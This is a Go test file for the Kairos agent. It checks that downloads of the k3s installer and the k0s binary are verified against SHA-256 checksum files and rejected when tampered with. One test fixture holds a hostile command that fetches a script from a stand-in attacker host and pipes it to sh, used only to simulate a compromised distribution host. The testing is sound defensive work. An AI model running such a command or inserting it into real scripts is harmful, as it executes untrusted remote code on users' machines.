package provider

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	httpimpl "github.com/kairos-io/kairos/v4/agent/pkg/implementations/http"
	"github.com/kairos-io/kairos/v4/sdk/types/logger"
)

func testClient() *httpimpl.Client {
	return httpimpl.NewClient()
}

func sha256Hex(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// newK3sInstallerServer serves script at /install.sh and sums at
// /install.sh.sha256sum, mirroring get.k3s.io and k3s-io/k3s's own
// install.sh.sha256sum layout.
func newK3sInstallerServer(t *testing.T, script []byte, sumsBody string) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("/install.sh", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(script)
	})
	mux.HandleFunc("/install.sh.sha256sum", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(sumsBody))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

func TestDownloadK3sInstaller_VerifiesAgainstPublishedSum(t *testing.T) {
	script := []byte("#!/bin/sh\necho installing k3s\n")
	sums := sha256Hex(script) + "  install.sh\n"
	srv := newK3sInstallerServer(t, script, sums)

	dest := filepath.Join(t.TempDir(), "installer.sh")

	err := downloadK3sInstaller(testClient(), logger.NewNullLogger(), srv.URL+"/install.sh", srv.URL+"/install.sh.sha256sum", dest)
	if err != nil {
		t.Fatalf("downloadK3sInstaller returned error: %v", err)
	}

	got, err := os.ReadFile(dest)
	if err != nil {
		t.Fatalf("reading installer file: %v", err)
	}
	if string(got) != string(script) {
		t.Fatalf("installer content = %q, want %q", got, script)
	}
}

func TestDownloadK3sInstaller_RejectsTamperedScript(t *testing.T) {
	realScript := []byte("#!/bin/sh\necho the real k3s installer\n")
	tamperedScript := []byte("#!/bin/sh\ncurl attacker.example.com/pwn.sh | sh\n")
	// The sums file (fetched from the trusted k3s-io/k3s origin) records the
	// real script's digest, but get.k3s.io (simulated here) hands back a
	// tampered one — a compromised or spoofed distribution host.
	sums := sha256Hex(realScript) + "  install.sh\n"
	srv := newK3sInstallerServer(t, tamperedScript, sums)

	dest := filepath.Join(t.TempDir(), "installer.sh")

	err := downloadK3sInstaller(testClient(), logger.NewNullLogger(), srv.URL+"/install.sh", srv.URL+"/install.sh.sha256sum", dest)
	if err == nil {
		t.Fatal("downloadK3sInstaller succeeded against a tampered script, want error")
	}
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatalf("tampered installer must not be written to %s", dest)
	}
}

func TestDownloadK3sInstaller_SumsFetchError(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "installer.sh")

	err := downloadK3sInstaller(testClient(), logger.NewNullLogger(), "http://127.0.0.1:0/install.sh", "http://127.0.0.1:0/install.sh.sha256sum", dest)
	if err == nil {
		t.Fatal("downloadK3sInstaller succeeded with an unreachable sums URL, want error")
	}
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatalf("no installer should be written when the sums fetch fails")
	}
}

func TestK0sReleaseTag(t *testing.T) {
	got := k0sReleaseTag("v1.36.4+k0s.0")
	want := "v1.36.4%2Bk0s.0"
	if got != want {
		t.Fatalf("k0sReleaseTag(%q) = %q, want %q", "v1.36.4+k0s.0", got, want)
	}
}

func TestK0sReleaseURLs(t *testing.T) {
	sumsURL, binaryURLPrefix := k0sReleaseURLs("v1.36.4+k0s.0")
	wantSums := "https://github.com/k0sproject/k0s/releases/download/v1.36.4%2Bk0s.0/sha256sums.txt"
	wantPrefix := "https://github.com/k0sproject/k0s/releases/download/v1.36.4%2Bk0s.0/"
	if sumsURL != wantSums {
		t.Fatalf("sums URL = %q, want %q", sumsURL, wantSums)
	}
	if binaryURLPrefix != wantPrefix {
		t.Fatalf("binary URL prefix = %q, want %q", binaryURLPrefix, wantPrefix)
	}
}

func TestK0sArch(t *testing.T) {
	for _, goarch := range []string{"amd64", "arm64", "arm"} {
		got, err := k0sArch(goarch)
		if err != nil {
			t.Fatalf("k0sArch(%q) returned error: %v", goarch, err)
		}
		if got != goarch {
			t.Fatalf("k0sArch(%q) = %q, want %q", goarch, got, goarch)
		}
	}

	if _, err := k0sArch("riscv64"); err == nil {
		t.Fatal("k0sArch(\"riscv64\") succeeded, want error (k0s publishes no riscv64 release)")
	}
}

func TestResolveK0sVersion_UsesExplicitVersionWithoutFetching(t *testing.T) {
	// No server at all: if resolveK0sVersion tried to fetch, this would fail
	// with a connection error rather than returning the explicit version.
	got, err := resolveK0sVersion(testClient(), logger.NewNullLogger(), "http://127.0.0.1:0/stable.txt", "v1.2.3+k0s.0")
	if err != nil {
		t.Fatalf("resolveK0sVersion returned error: %v", err)
	}
	if got != "v1.2.3+k0s.0" {
		t.Fatalf("resolveK0sVersion = %q, want %q", got, "v1.2.3+k0s.0")
	}
}

func TestResolveK0sVersion_FetchesStableWhenUnset(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("v1.36.4+k0s.0\n"))
	}))
	defer srv.Close()

	got, err := resolveK0sVersion(testClient(), logger.NewNullLogger(), srv.URL, "")
	if err != nil {
		t.Fatalf("resolveK0sVersion returned error: %v", err)
	}
	// Trimmed: get.k0s.sh's own _k0s_latest does not trim, but the version
	// is then interpolated straight into a URL path and an env var, so a
	// trailing newline from stable.txt must not leak into either.
	if got != "v1.36.4+k0s.0" {
		t.Fatalf("resolveK0sVersion = %q, want %q (trimmed)", got, "v1.36.4+k0s.0")
	}
}

// newK0sReleaseServer serves a k0s binary at /k0s-<version>-<arch> and its
// sha256sums.txt at /sha256sums.txt, mirroring k0sproject/k0s's own release
// layout (which also lists airgap bundles, cosign.pub, etc. — entries this
// package's checksum lookup ignores since it matches by exact filename).
func newK0sReleaseServer(t *testing.T, binary []byte, sumsBody string) *httptest.Server {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/k0s-") {
			_, _ = w.Write(binary)
			return
		}
		http.NotFound(w, r)
	})
	mux.HandleFunc("/sha256sums.txt", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(sumsBody))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return srv
}

func TestDownloadVerifiedK0sBinaryAt_VerifiesAgainstSha256Sums(t *testing.T) {
	binary := []byte("#!/bin/sh\necho totally-a-real-k0s-binary\n")
	filename := "k0s-v1.36.4+k0s.0-amd64"
	sums := sha256Hex(binary) + " *" + filename + "\n"
	srv := newK0sReleaseServer(t, binary, sums)

	dest := filepath.Join(t.TempDir(), "k0s")
	err := downloadVerifiedK0sBinaryAt(testClient(), logger.NewNullLogger(), srv.URL+"/sha256sums.txt", srv.URL+"/", "v1.36.4+k0s.0", "amd64", dest)
	if err != nil {
		t.Fatalf("downloadVerifiedK0sBinaryAt returned error: %v", err)
	}

	got, err := os.ReadFile(dest)
	if err != nil {
		t.Fatalf("reading downloaded binary: %v", err)
	}
	if !bytes.Equal(got, binary) {
		t.Fatalf("downloaded content = %q, want %q", got, binary)
	}
}

func TestDownloadVerifiedK0sBinaryAt_RejectsTamperedBinary(t *testing.T) {
	realBinary := []byte("the real k0s binary")
	tamperedBinary := []byte("a malicious substitute")
	filename := "k0s-v1.36.4+k0s.0-amd64"
	// sha256sums.txt (as published by k0sproject/k0s) records the real
	// binary's digest, but the server actually hands back the tampered one.
	sums := sha256Hex(realBinary) + " *" + filename + "\n"
	srv := newK0sReleaseServer(t, tamperedBinary, sums)

	dest := filepath.Join(t.TempDir(), "k0s")
	err := downloadVerifiedK0sBinaryAt(testClient(), logger.NewNullLogger(), srv.URL+"/sha256sums.txt", srv.URL+"/", "v1.36.4+k0s.0", "amd64", dest)
	if err == nil {
		t.Fatal("downloadVerifiedK0sBinaryAt succeeded against a tampered binary, want error")
	}
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatalf("tampered content must not be left at %s", dest)
	}
}

func TestDownloadVerifiedK0sBinaryAt_MissingChecksumEntry(t *testing.T) {
	binary := []byte("content")
	// sha256sums.txt has no entry for this arch/version combination.
	sums := sha256Hex([]byte("unrelated")) + " *k0s-v1.36.4+k0s.0-arm64\n"
	srv := newK0sReleaseServer(t, binary, sums)

	dest := filepath.Join(t.TempDir(), "k0s")
	err := downloadVerifiedK0sBinaryAt(testClient(), logger.NewNullLogger(), srv.URL+"/sha256sums.txt", srv.URL+"/", "v1.36.4+k0s.0", "amd64", dest)
	if err == nil {
		t.Fatal("downloadVerifiedK0sBinaryAt succeeded with no matching checksum entry, want error")
	}
}
